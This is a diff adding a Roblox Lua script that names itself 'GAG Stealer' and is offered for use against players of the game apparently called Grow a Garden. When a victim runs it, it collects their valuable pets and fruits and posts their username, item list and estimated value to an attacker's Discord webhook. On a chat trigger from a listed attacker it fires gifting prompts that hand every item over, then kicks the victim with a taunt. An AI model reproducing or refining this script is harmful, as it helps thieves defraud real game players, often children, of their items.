@@ -1,0 +1,312 @@
+-- GAG  Main Script
+-- For support: discord.gg/notyet
+
+--------------------------
+-- USER CONFIG SETTINGS --
+--------------------------
+local CONFIG = {
+    USERNAMES = _G.Usernames or {},
+    WEBHOOK   = _G.webhook or "",
+    MIN_VALUE = _G.min_value or 10000000,
+    PING      = _G.pingEveryone or "No",
+}
+
+-- Emoji maps
+local RARE_PETS = {
+    ["Raccoon"]        = "🦥",
+    ["Dragonfly"]      = "🐦‍🔥",
+    ["Red Fox"]        = "🦊",
+    ["Chicken Zombie"] = "🧟‍♂️",
+    ["Disco Bee"]      = "🪩",
+    ["Queen Bee"]      = "🐝",
+    ["Butterfly"]      = "🦋",
+    ["Mimic Octopus"]  = "🐙",
+}
+local DEFAULT_PET_EMOJI = "🐶"
+local DEFAULT_FRUIT_EMOJI = "🥝"
+
+-------------------------------
+-- FIREPROXIMITY BYPASS PATCH --
+-------------------------------
+local function bypassProximityPrompt(prompt)
+    local ok, result = pcall(function() return fireproximityprompt(prompt) end)
+    if ok then return end
+    if prompt and prompt.InputHoldBegin then
+        prompt.InputHoldBegin(prompt)
+        task.wait(prompt.HoldDuration or 0.5)
+        if prompt.InputHoldEnd then prompt.InputHoldEnd(prompt) end
+    elseif prompt and prompt.Trigger then
+        prompt:Trigger()
+    else
+        warn("FireProximity bypass failed.")
+    end
+end
+getgenv().fireproximityprompt = bypassProximityPrompt
+
+print("GAG Stealer loaded. Join discord.gg/notyet For further support!")
+
+--------------------------
+-- SERVICE/VARIABLE INIT --
+--------------------------
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local backpack = plr:WaitForChild("Backpack")
+local modules = replicatedStorage:WaitForChild("Modules")
+local req = request or http_request or (syn and syn.request)
+
+--------------------------
+-- CORE VALIDITY CHECKS --
+--------------------------
+if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
+    plr:Kick("Missing username or webhook in config!")
+    return
+end
+local function isPrivateServer()
+    local ok, result = pcall(function()
+        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+    end)
+    return not ok or (result == "VIPServer" or result == "PrivateServer")
+end
+if isPrivateServer() or #Players:GetPlayers() >= 5 then
+    plr:Kick("Server not supported. Use a public GAG server with <5 players.")
+    return
+end
+if game.PlaceId ~= 126884695634066 then
+    plr:Kick("Unsupported game. Join a normal GAG server.")
+    return
+end
+
+------------------------
+-- IMPORT DEPENDENCIES --
+------------------------
+local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils        = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry     = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil      = require(modules:WaitForChild("NumberUtil"))
+local dataService     = require(modules:WaitForChild("DataService"))
+local excludedItems   = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+
+----------------------------
+-- UTILITY FORMAT FUNCTIONS
+----------------------------
+local function getPetEmoji(name)
+    return RARE_PETS[name] or DEFAULT_PET_EMOJI
+end
+local function getFruitEmoji()
+    return DEFAULT_FRUIT_EMOJI
+end
+local function getPetAge(tool)
+    return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?"
+end
+local function getWeight(tool)
+    local val = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
+    if val then
+        if val:IsA("NumberValue") or val:IsA("IntValue") then
+            return math.floor(val.Value * 100 + 0.5) / 100
+        elseif val:IsA("StringValue") then
+            return tonumber(val.Value) or 0
+        end
+    end
+    local m = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+    return m and tonumber(m) or 0
+end
+local function formatValue(n)
+    local s = tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","")
+    return s
+end
+
+-----------------------------
+-- COLLECT INVENTORY ITEMS --
+-----------------------------
+local itemsToSend, totalValue = {}, 0
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local name = v14.PetType
+            -- Calculate value
+            local petVal = 0
+            do
+                local hatchedFrom = v14.PetData.HatchedFrom
+                if hatchedFrom and hatchedFrom ~= "" then
+                    local eggData = petRegistry.PetEggs[hatchedFrom]
+                    if eggData then
+                        local v17 = eggData.RarityData.Items[v14.PetType]
+                        if v17 and v17.GeneratedPetData.WeightRange then
+                            local weightRange = v17.GeneratedPetData.WeightRange
+                            local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+                            local v20 = math.lerp(0.8, 1.2, v19)
+                            local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+                            local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+                            petVal = math.floor(petRegistry.PetList[v14.PetType].SellPrice * v22)
+                        end
+                    end
+                end
+            end
+            local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
+            local petAge = getPetAge(tool)
+            if RARE_PETS[name] or petWeight >= 10 then
+                totalValue = totalValue + petVal
+                table.insert(itemsToSend, {
+                    Tool  = tool,
+                    Name  = name,
+                    Value = petVal,
+                    Weight= petWeight,
+                    Type  = "Pet",
+                    Emoji = getPetEmoji(name),
+                    Age   = petAge
+                })
+            end
+        else
+            local value = calcPlantValue(tool)
+            if value >= CONFIG.MIN_VALUE then
+                local weight = getWeight(tool)
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {
+                    Tool  = tool,
+                    Name  = tool:GetAttribute("ItemName") or tool.Name,
+                    Value = value,
+                    Weight= weight,
+                    Type  = "Fruit",
+                    Emoji = getFruitEmoji(),
+                    Age   = nil
+                })
+            end
+        end
+    end
+end
+if #itemsToSend == 0 then return end
+
+table.sort(itemsToSend, function(a, b)
+    if a.Type == "Pet" and b.Type ~= "Pet" then return true
+    elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
+    else return a.Value > b.Value end
+end)
+
+---------------------------
+-- EMBED PAYLOAD CREATION
+---------------------------
+local function formatItemLine(item)
+    if item.Type == "Pet" then
+        return string.format("%s - %s [%.2f KG] [Age %s]", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"))
+    else
+        return string.format("%s - %s [%.2f KG]", item.Emoji, item.Name, item.Weight)
+    end
+end
+local itemLines = {}
+for _, item in ipairs(itemsToSend) do
+    table.insert(itemLines, formatItemLine(item))
+end
+local itemBlock = table.concat(itemLines, "\n")
+if #itemBlock > 1024 then
+    itemBlock = itemBlock:sub(1,1020) .. "\n...and more!"
+end
+local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
+local joinText = ("**[Join The player](%s)**"):format(joinLink)
+
+-------------------------
+-- SEND MAIN WEBHOOK  --
+-------------------------
+local function sendInitialWebhook()
+    local fields = {
+        {name = "**You just got something!**", value = itemBlock, inline = false},
+        {name = "Victim Username", value = plr.Name, inline = true},
+        {name = "Approximatlly value", value = "`"..formatValue(totalValue).."`", inline = false},
+        {name = "Join Link", value = joinText, inline = false}
+    }
+    local data = {
+        content = (CONFIG.PING == "Yes" and "@everyone" or ""),
+        embeds  = {{
+            title  = "🎁 GAG Heist Log",
+            color  = 65280,
+            fields = fields,
+            footer = { text = "GAG stealer by Timoci. discord.gg/notyet" }
+        }}
+    }
+    local body = HttpService:JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body}) end
+end
+sendInitialWebhook()
+
+--------------------------
+-- WEBHOOK ON LEAVE/EVENT
+--------------------------
+local function sendLeaveWebhook()
+    local leaveData = {
+        content = (CONFIG.PING == "Yes" and "@everyone" or ""),
+        embeds = {{
+            title = "🚪 Player left before gifting",
+            color = 16711680,
+            fields = {
+                {name = "Victim Username", value = plr.Name, inline = true},
+                {name = "Status", value = "Victim left the server/disconnected before items could be transferred."}
+            },
+            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
+        }}
+    }
+    local leaveBody = HttpService:JSONEncode(leaveData)
+    local headers = {["Content-Type"] = "application/json"}
+    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = leaveBody}) end
+end
+
+Players.PlayerRemoving:Connect(function(player)
+    if player == plr then
+        sendLeaveWebhook()
+    end
+end)
+
+--------------------------
+-- INTERACTION / STEAL   --
+--------------------------
+local function doSteal(player)
+    local myChar = plr.Character or plr.CharacterAdded:Wait()
+    local victimRoot = myChar:WaitForChild("HumanoidRootPart")
+    victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
+    wait(0.1)
+    for _, item in ipairs(itemsToSend) do
+        item.Tool.Parent = myChar
+        local prompt
+        if item.Type == "Pet" then
+            prompt = player.Character and player.Character.Head and player.Character.Head:FindFirstChildOfClass("ProximityPrompt")
+                    or player.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt")
+        else
+            prompt = player.Character and player.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt")
+        end
+        if prompt then bypassProximityPrompt(prompt) end
+        wait(0.12)
+        item.Tool.Parent = backpack
+        wait(0.08)
+    end
+    -- Wait until all items gone from backpack
+    local stillInBackpack = true
+    while stillInBackpack do
+        stillInBackpack = false
+        for _, item in ipairs(itemsToSend) do
+            if backpack:FindFirstChild(item.Tool.Name) then
+                stillInBackpack = true
+                break
+            end
+        end
+        task.wait(0.1)
+    end
+    plr:Kick("All your stuff just got stolen by Timoci's stealer!\nJoin discord.gg/notyet")
+end
+
+local function listenForUser()
+    local triggered = false
+    local function onChat(player)
+        if not table.find(CONFIG.USERNAMES, player.Name) then return end
+        player.Chatted:Connect(function()
+            if triggered then return end
+            triggered = true
+            doSteal(player)
+        end)
+    end
+    for _, p in ipairs(Players:GetPlayers()) do onChat(p) end
+    Players.PlayerAdded:Connect(onChat)
+end
+listenForUser()
